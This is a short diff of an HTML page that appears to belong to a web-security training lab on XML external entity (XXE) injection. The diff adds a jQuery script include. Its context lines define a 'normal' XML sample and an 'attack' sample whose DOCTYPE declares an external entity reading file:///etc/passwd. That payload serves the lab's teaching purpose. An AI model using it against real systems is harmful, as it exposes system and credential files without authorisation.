@@ -12,6 +12,7 @@
 	
 			<!--Icons-->
 			<script src="/js/lumino.glyphs.js"></script>
+			<script src="/js/jquery.min.js"></script>
 			<script src="/js/hints.js"></script>
 			<link
 				href="https://fonts.googleapis.com/css2?family=Hind:wght@700&display=swap"
@@ -21,6 +22,8 @@
 					var normal = '<items><item name="item1"> item1 </item><item name="item2"> item2 </item><item name="item3"> item3 </item><item name="item4"> item4 </item></items>';
 					var attack = '<!DOCTYPE item [ <!ELEMENT item ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><items><item name="item1">a</item><item name="item2">a &xxe;</item><item name="item3">c</item><item name="item4">d</item></items>';
 					
+
+
 					  $(document).ready(function(){
 					  $("#normal").click(function(){
 						  $('#textarea').text('');
